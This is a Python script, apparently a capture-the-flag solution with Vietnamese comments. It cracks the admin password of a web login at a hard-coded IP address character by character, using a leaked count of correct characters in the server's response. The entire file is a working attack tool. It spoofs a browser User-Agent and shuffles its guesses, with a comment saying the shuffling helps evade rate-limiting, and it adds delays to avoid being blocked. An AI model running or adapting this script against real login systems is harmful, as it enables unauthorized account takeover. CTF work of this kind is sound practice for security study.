import re
import time
import random
import string
import requests
from typing import Optional

BASE_URL = "http://52.59.124.14:5015"
LOGIN_PATH = "/login.php"

USERNAME = "admin"  # thay nếu khác

# Bạn có thể thu hẹp cho nhanh (ví dụ chỉ lowercase + số)
alphabet = list(string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-!@#$%^&*{}[]()=+~.,:")
random.shuffle(alphabet)  # shuffle một tí để server khó rate-limit theo pattern

# Nếu site cần giữ cookie phiên cụ thể:
SESSION_COOKIE = None  # ví dụ: "5587ccc721ba51582f6590286f60e00a" hoặc để None

# Từ khóa nhận diện “login thành công”
SUCCESS_KEYWORDS = [
    "Welcome", "Đăng nhập thành công", "success", "flag", "Logged in", "dashboard"
]

# Regex để móc “X ký tự đúng”, “X correct”, “X matches”,…
COUNT_PATTERNS = [
    r"(\d+)\s*(?:ký tự|ki tu|characters?|char|correct|đúng|dung|matches?)",
    r"correct\s*=\s*(\d+)",
    r"matches\s*=\s*(\d+)",
    r">(\d+)<",  # fallback thô—tránh bắt nhầm, nhưng để cuối
    r"\b(\d{1,3})\b"  # mạnh tay cuối cùng (cẩn thận false positive)
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/index.php",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

def extract_count(html: str) -> Optional[int]:
    lower = html.lower()
    for pat in COUNT_PATTERNS:
        m = re.search(pat, lower)
        if m:
            try:
                return int(m.group(1))
            except:
                pass
    return None

def is_success(html: str) -> bool:
    low = html.lower()
    return any(k.lower() in low for k in SUCCESS_KEYWORDS)

def send_guess(sess: requests.Session, guess: str, verbose=False) -> tuple[Optional[int], bool, str]:
    data = {
        "username": USERNAME,
        "password": guess
    }
    url = f"{BASE_URL}{LOGIN_PATH}"
    r = sess.post(url, data=data, headers=HEADERS, timeout=10)
    body = r.text

    if verbose:
        print(f"[TRY] {guess!r}  status={r.status_code}")

    # Nếu server redirect sau khi đúng, requests vẫn trả body của trang đích (theo mặc định follow redirects)
    if is_success(body):
        return None, True, body

    cnt = extract_count(body)
    return cnt, False, body

def crack(max_len: int = 64, delay: float = 0.05, verbose_every: int = 1):
    sess = requests.Session()
    if SESSION_COOKIE:
        sess.cookies.set("PHPSESSID", SESSION_COOKIE, domain="52.59.124.14")

    prefix = ""
    # baseline: số ký tự đúng với chuỗi trống (nếu server xử lý len=0) hoặc với ký tự sai nào đó
    baseline_cnt = 0
    # Thử baseline bằng chuỗi rỗng
    cnt, ok, body = send_guess(sess, prefix, verbose=False)
    if ok:
        print("[OK] Đăng nhập thành công với mật khẩu rỗng?!")
        return ""

    if cnt is not None:
        baseline_cnt = cnt
    else:
        # nếu trả về None (không parse được), in gợi ý debug và dừng sớm
        print("[WARN] Không parse được số ký tự đúng từ phản hồi. In một phần nội dung để bạn chỉnh regex:")
        print(body[:500])
        print("\nHãy sửa COUNT_PATTERNS cho khớp thông điệp của bài CTF.")
        return None

    print(f"[INFO] Baseline count: {baseline_cnt}")

    for pos in range(max_len):
        found = False
        best_char = None

        # random hóa thứ tự để giảm accidental matches ở các vị trí phía sau
        random.shuffle(alphabet)

        for idx, ch in enumerate(alphabet, 1):
            guess = prefix + ch
            cnt, ok, body = send_guess(sess, guess, verbose=False)

            if ok:
                print(f"[SUCCESS] Đăng nhập thành công! password = {guess!r}")
                return guess

            if cnt is None:
                # In vài dòng gợi ý debug:
                print("[WARN] Không đọc được count. Response snippet:")
                print(body[:300])
                # có thể server rate-limit/ đổi thông điệp—nghỉ một nhịp rồi thử tiếp
                time.sleep(0.4)
                continue

            # Khi đúng ký tự, vì ta đang so sánh theo vị trí, số đúng sẽ = baseline_cnt + 1
            if cnt == baseline_cnt + 1:
                prefix += ch
                baseline_cnt = cnt
                found = True
                best_char = ch
                if pos % max_len == 0 or (pos+1) % max(1, verbose_every) == 0:
                    print(f"[HIT] pos={pos} -> '{ch}'  | prefix={prefix!r}  (count={cnt})")
                break

            # nhẹ tay tránh rate-limit
            time.sleep(delay)

        if not found:
            # Không ký tự nào tăng count ⇒ có thể đã kết thúc mật khẩu tại đây
            print(f"[DONE] Không có ký tự nào làm tăng count ở vị trí {pos}.")
            print(f"[RESULT] password có vẻ là: {prefix!r}")
            return prefix

    print(f"[STOP] Đạt giới hạn max_len={max_len}. Kết quả tạm: {prefix!r}")
    return prefix

if __name__ == "__main__":
    # Tùy server, bạn có thể tăng/giảm delay để tránh bị chặn.
    final_pw = crack(max_len=64, delay=0.05, verbose_every=1)
    print(">>> Password:", final_pw)
